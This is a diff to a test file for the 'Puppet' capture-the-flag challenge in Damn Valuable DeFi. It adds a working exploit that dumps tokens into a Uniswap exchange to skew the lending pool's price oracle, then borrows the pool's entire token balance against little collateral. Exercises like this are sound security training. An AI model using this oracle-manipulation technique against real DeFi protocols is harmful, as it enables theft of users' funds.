@@ -38,11 +38,11 @@ describe('[Challenge] Puppet', function () {
         this.token = await DamnValuableToken.new({ from: deployer });
 
         // Deploy a exchange that will be used as the factory template
-        this.exchangeTemplate = await UniswapExchange.new({from: deployer});
+        this.exchangeTemplate = await UniswapExchange.new({ from: deployer });
 
         // Deploy factory, initializing it with the address of the template exchange
         this.uniswapFactory = await UniswapFactory.new({ from: deployer });
-        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address, {from: deployer});
+        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address, { from: deployer });
 
         // Create a new exchange for the token, and retrieve the deployed exchange's address
         const { logs } = await this.uniswapFactory.createExchange(this.token.address, { from: deployer });
@@ -54,7 +54,7 @@ describe('[Challenge] Puppet', function () {
             this.uniswapExchange.address,
             { from: deployer }
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -93,11 +93,26 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        let oraclePrice = await this.lendingPool.computeOraclePrice()
+        let tokenBalance = await this.token.balanceOf(this.uniswapExchange.address)
+        console.log("OraclePrice before is", oraclePrice.toString())
+        console.log("tokenBalance before is", tokenBalance.toString())
+
+        await this.token.transfer(this.uniswapExchange.address, ATTACKER_INITAL_TOKEN_BALANCE, { from: attacker })
+
+        oraclePrice = await this.lendingPool.computeOraclePrice()
+        tokenBalance = await this.token.balanceOf(this.uniswapExchange.address)
+        console.log("OraclePrice after is", oraclePrice.toString())
+        console.log("tokenBalance after is", tokenBalance.toString())
+
+        const poolBalance = await this.token.balanceOf(this.lendingPool.address)
+        console.log("LendingPool token balance is", poolBalance.toString())
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ether('25'), from: attacker })
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
@@ -105,7 +120,7 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.bignumber.eq('0');
-        
+
         // Attacker ETH balance has not decreased
         expect(
             await balance.current(attacker)
